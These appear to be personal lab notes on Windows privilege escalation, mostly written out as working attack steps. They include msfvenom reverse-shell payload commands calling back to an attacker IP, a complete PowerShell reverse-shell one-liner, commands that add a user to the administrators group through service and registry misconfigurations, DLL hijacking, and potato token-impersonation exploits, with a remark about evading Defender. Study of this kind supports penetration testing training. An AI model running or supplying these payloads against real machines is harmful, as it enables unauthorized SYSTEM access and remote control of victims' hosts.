WinPrivEsc-2

OS: Windows 7 

# 1. Registry Escaltion- Autorun

**Analysis:** 

Using windows sysinternal tool called autorun(I think similar to procmon.exe)

In Logon tab , is looking for "c:\program files\autorun program\program.exe" is not found. The registry HiVE location is.HKLM\Software\MicrosoftWindows\CurrentVersion\Run 

**Checking PATH Permissions**

If the path "C:\Program files\Autorun program\" is writable then a malicious file can be placed as program.exe and gain privilege access. 

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"-

Found that everyone has read and write access

**Gaining Privileged Access**

Generate a payload using msfvenom, for reverse shell.

msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.9.187 lport=9001 -f exe -o program.exe

Transfer the payload to the C:\Program Files\Autorun Program folder and open a netcat listener on local machine.

Restart will give shell with admin privileges. 


# 2. Registry Escalation- AlwaysInstallElevated

**Analysis**
Query the follwoing registry hive 

Checking for Local Machine Policies:

C:\Users\user>reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
Checking for Current User Policies: 

C:\Users\user>reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


**Privilege Escalation** 

Generate a windows installer payload using msfvenom. 

 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.9.187 lport=9001 -f msi -o setup.msi  

Transfer the payload to writable directory and execute it using msexec 

 msiexec /quiet /qn /i C:\Temp\setup.msi
 
 
# 3.  Service Escalation- Registry

**Analysis**
 
Check the following registry hive permissions using Powershell

Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         ***NT AUTHORITY\INTERACTIVE Allow  FullControl***
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)

***Exploitation***

Make a payload as windows executable using msfvenom 

Transfer the payload to the host machine 

Change the registry value so that the sevice is called when registry service starts

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

Then start regsvc


# 4 . Service Escalation: Executable Files

**Analysis**

Using accesschk: 

Accesschk is windows sysinternal that helps you list the permissions of service binaries.

accesschk.exe -uvw "folder"--start with program files.

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

**Exploitation**

From above the service filepermservice.exe has Read/Write access for everyone

copy C:\Tem\rev.exe "C:\program files\file Permissions Service\filepermservice.exe"

# 5. Privilege Escalation- Statup Application

**Analysis**

Check the windows startup folder permissions

using icacls check the permissions


C:\Users\user>icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start
up"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 

BUILTIN\Users:(F)
TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
NT AUTHORITY\SYSTEM(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files


found that builtin users have full permissions

**Exploitation**

copy the paylaod executable to the startupfolder

# Service Escalation- DLL Hijacking 

**Analysis** 
Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

**Exploitation**

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

# Service Escalation: Binarypath

**Detection**

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

**Exploitation**

Windows VM

1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

# Service Escalation- Unquoted Service Paths

**Detection**

Windows VM

1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

**Exploitation**

Kali VM

1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
2. Copy the generated file, common.exe, to the Windows VM.

Windows VM

1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).

cGFzc3dvcmQxMjM= 


# Token Impersonation: 

Token Impersonation is a technique used to impersonate another logged on user. 

**With Powershell**

Powershell can be leveraged to impersonate token. 
****This will spawn a new thread as the user you impersonation, but it can be made to work in the same thread. Therefore, if you impersonate and then type whoami it might still show the original username, but you still have privs as your target user. If you do however spawn a new process (or a new shell) and migrate to that you will have a shell as the account you are impersonating****	

Powershell_powersploit: 

https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1

Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser" 

Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

 **Rotten Pottato**
 
 The rotten potato exploit is a privilege escalation technique that allows escalation from service level accounts to SYSTEM through token impersonation. This can be achieved through uploading an exe file exploit and executing or through memory injection with psinject in either Empire or Metasploit. See Foxglove security's writeup of the exploit for more detail.
 
***Meterpreter***
Get a meterpreter shell as a service account and upload rot.exe to the box.
getuid - shows who you are, like whoami getprivs - shows you available tokens for impersonation getsystem - allows SYSTEM token impersonation directly in meterpreter if local admin use incognito - loads an extension that allows token impersonation list_tokens -u - lists available impersonation and delegation tokens
Now this is not very nice, but upload the exploit to disk Now you can use meterpreter's feature of executing binaries straight into memory and if that doesn't work upload it to disk as a dll and use rundll32 to execute it.
execute -H -c -m -d calc.exe -f /root/rot.exe upload rot.dll "c:\temp\rot.dll" execute -H -c -f "rundll32 c:\temp\rot.dll,Main Now do list_tokens -u again, and an impersonation token for SYSTEM should be available. You can then impersonate using impersonate_token "NT AUTHORITY\SYSTEM"
Congratulations, you are now system


**Lonely Potato**

I did this on Windows 10 with Defender and nothing triggered. You could probably implement a better obfuscated reverse shell if you like.

Make a powershell reverse shell and put it in a file test.bat.

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.9',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Upload it to the target machine on c:\windows\temp\test.bat. The directory doesn't really matter, this is just an example.

Upload MSFRottenPotato.exe to your target machine. Now depending on what token privs you have you can use this exploit. So enumerate your token privs with:

whoami /priv

If you only have SeImpersonatePrivilege you can use the CreateProcesAsUser, (t) argument. If you have both SeImpersonatePrivilege and SeAssignPrimaryToken you can use CreateProcessWithTokenW, (*) argument.

Set up your listener in empire, metasploit, netcat or whatever you prefer.

Execute it with

c:\windows\temp\MSFRottenPotato.exe t c:\windows\temp\test.bat


**Juicy Potato**

Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation. 

How does it work?
I will admit I am not an expert in Windows internals, but I have tried to understand how this exploit works. A CLSID is a globally unique identifier that identifies a COM class object. The exploit allows us to escalate from service accounts in session 0 to SYSTEM. More to come once I understand it all!

How to use
As we can see, we are on Windows 10 Enterprise 1709, but the OS shouldn't matter. We need to have a shell as a service account. For demo purposes I usednt authority\local service 

The only real requirement however, is that the account has the SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege which most service accounts do have.

To try this yourself, you can open a shell as the service account using psexec from Microsoft Sysinternals as displayed in the screenshot below. 

PsExec64.exe -i -u "nt authority\local service" cmd.exe

We then pick a CLSID from here. Interesting note: Numerous CLSIDs belong to LOGGED-IN-USER, so if you select this use this and a domain admin is logged in you can basically escalate directly to DA. However, it will only get the user of the first session (1). Finding a way to predict which user that is will require further testing. Either way, SYSTEM level privileges will get you where you want.

Now we run the exploit by specifiying a COM port of 1337, and executing the process cmd.exe trying both techniques CreateProcessWithTokenW,  CreateProcessAsUser A shell pops as nt authority\system

juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}


Mitigation
This can't simply be patched. It's due to how service accounts needing to impersonate users when kerberos delegation is enabled.

According to the creators, the actual solution is to protect sensitive accounts and applications which run under the * SERVICE accounts.








